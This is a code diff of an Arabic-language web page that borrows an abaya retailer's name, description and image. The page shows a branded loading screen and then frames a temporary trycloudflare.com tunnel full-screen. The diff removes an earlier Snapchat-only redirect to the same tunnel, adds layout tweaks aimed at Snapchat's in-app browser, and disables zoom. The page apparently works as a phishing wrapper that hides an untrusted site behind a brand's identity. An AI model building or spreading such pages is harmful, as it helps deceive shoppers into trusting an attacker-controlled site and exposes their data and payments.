@@ -2,59 +2,51 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- منع تكبير/تصغير الشاشة العشوائي وثبات الأبعاد -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>abayajudia</title>
     <meta property="og:title" content="abayajudia">
     <meta property="og:description" content="باعتبارنا علامة تجارية متخصصة في العبايات فإننا نقدم مجموعة متنوعة من المنتجات بما في ذلك العبايات والتنانير والبلوزات والسترات وكل ما تحتاجه.">
     <meta property="og:image" content="https://abayajudi.com/wp-content/uploads/2024/09/SAVE_20260513_190924.jpg">
     <meta property="og:url" content="https://abayajudia.new-collection/">
     <meta property="og:type" content="website">
-    
-    <!-- سكريبت الفحص والتحويل الفوري إذا كان المتصفح هو سناب شات -->
-    <script>
-        (function() {
-            var ua = navigator.userAgent || navigator.vendor || window.opera;
-            // التحقق مما إذا كان المستخدم يفتح من تطبيق سناب شات
-            if (ua.indexOf('Snapchat') !== -1) {
-                // توجيه فوري للرابط الأصلي متخطياً مشاكل الـ iframe تماماً في سناب
-                window.location.replace("https://dodge-bidder-watching-television.trycloudflare.com");
-            }
-        })();
-    </script>
-
     <style>
+        /* تثبيت الـ Viewport الحقيقي مع منع أي Scroll خارجي نهائياً */
         body, html { 
             margin: 0; 
             padding: 0; 
             width: 100%;
-            height: 100vh; 
+            height: 100%;
+            position: fixed; /* لحل مشاكل التثبيت في سناب شات */
             overflow: hidden; 
             background-color: #f9f9f9; 
             font-family: Tahoma, sans-serif;
+            -webkit-overflow-scrolling: touch;
         }
         
+        /* شاشة التحميل */
         #loader {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
-            height: 100vh;
+            height: 100%;
             background-color: #ffffff;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             z-index: 9999;
-            transition: opacity 0.5s ease;
+            transition: opacity 0.4s ease;
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
+            width: 45px;
+            height: 45px;
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #333;
+            border-top: 4px solid #111;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
             margin-bottom: 15px;
         }
 
@@ -64,27 +56,34 @@
         }
 
         .brand-loading {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: bold;
-            color: #333;
+            color: #222;
             letter-spacing: 1px;
         }
 
+        /* تنسيق الـ Iframe لملء شاشة سناب شات بدقة وتفعيل الـ Hardware Acceleration */
         iframe { 
             width: 100%; 
-            height: 100vh; 
+            height: 100%; 
             border: none;
             display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+            transform: translateZ(0); /* تسريع الأداء عبر كارت الشاشة */
         }
     </style>
 </head>
 <body>
 
+    <!-- شاشة التحميل -->
     <div id="loader">
         <div class="spinner"></div>
         <div class="brand-loading">abayajudia</div>
     </div>
 
+    <!-- الـ Iframe -->
     <iframe src="https://dodge-bidder-watching-television.trycloudflare.com" onload="hideLoader()"></iframe>
 
     <script>
@@ -93,7 +92,7 @@
             loader.style.opacity = '0';
             setTimeout(() => {
                 loader.style.display = 'none';
-            }, 500);
+            }, 400);
         }
     </script>
 
